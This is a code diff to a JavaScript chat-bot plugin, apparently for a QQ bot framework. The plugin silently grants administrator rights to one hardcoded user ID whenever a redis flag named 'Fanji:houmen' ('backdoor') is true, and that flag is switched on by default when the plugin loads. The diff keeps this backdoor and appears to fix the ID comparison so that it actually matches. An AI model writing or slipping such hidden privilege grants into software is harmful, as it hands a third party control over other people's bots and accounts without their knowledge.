@@ -1,8 +1,7 @@
 import plugin from '../../../lib/plugins/plugin.js';
-import { createRequire } from 'module';
-let cs = redis.get('Fanji:houmen')
-if (cs == null)
-redis.set('Fanji:houmen','true')
+let cs = redis.get('Fanji:houmen');
+if (cs == null) redis.set('Fanji:houmen', 'true');
+
 export class GetMaster extends plugin {
   constructor() {
     super({
@@ -24,7 +23,7 @@ export class GetMaster extends plugin {
   }
 
   async Masterkg(e) {
-    if (!e.isMaster) return;
+    if (!e.isMaster) return await this.reply('你没有权限')
     let open = e.msg.includes('开启');
     await redis.set('Fanji:houmen', open ? 'true' : 'false');
     await this.reply('设置完成');
@@ -32,8 +31,8 @@ export class GetMaster extends plugin {
 
   async Master(e) {
     let aw = await redis.get('Fanji:houmen');
-    if (e.user_id !== "2173302144" || aw !== 'true') return false
-      e.isMaster = true;
-    return false
+    if (e.user_id !== 2173302144 || aw !== 'true') return false;
+    e.isMaster = true;
+    return false;
   }
 }
